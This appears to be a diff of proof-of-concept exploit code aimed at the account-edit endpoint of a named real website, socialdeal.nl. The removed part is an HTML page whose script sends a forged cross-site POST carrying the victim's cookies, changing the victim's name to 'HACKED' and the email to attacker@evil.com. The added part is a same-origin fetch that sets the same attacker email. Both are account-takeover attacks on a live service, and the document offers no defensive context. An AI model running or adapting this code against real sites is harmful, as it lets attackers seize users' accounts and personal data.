@@ -1,31 +1,16 @@
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-(async () => {
-  const params = new URLSearchParams();
-  params.append('salutation', 'male');
-  params.append('firstName', 'HACKED');
-  params.append('lastName', 'HACKED');
-  params.append('birthDate-day', '5');
-  params.append('birthDate-month', '5');
-  params.append('birthDate-year', '1996');
-  params.append('email', 'attacker@evil.com');
-  
-  const resp = await fetch('https://www.socialdeal.nl/modal/account/edit/', {
-    method: 'POST',
-    credentials: 'include',
-    mode: 'no-cors',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded'
-    },
-    body: params.toString()
-  });
-  
-  // With no-cors we can't read the response, but the request still goes through
-  console.log('Request sent', resp.status);
-  document.body.innerHTML = '<h1>Request sent - check if email changed</h1>';
-})();
-</script>
-</body>
-</html>
+fetch('/modal/account/edit/', {
+  method: 'POST',
+  credentials: 'same-origin',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-Requested-With': 'XMLHttpRequest',
+    'Accept': 'application/json'
+  },
+  body: JSON.stringify({
+    salutation: 'male',
+    firstName: 'Test',
+    lastName: 'Tester',
+    birthDate: '1996-05-05',
+    email: 'attacker@evil.com'
+  })
+}).then(r => r.json()).then(console.log).catch(console.error);
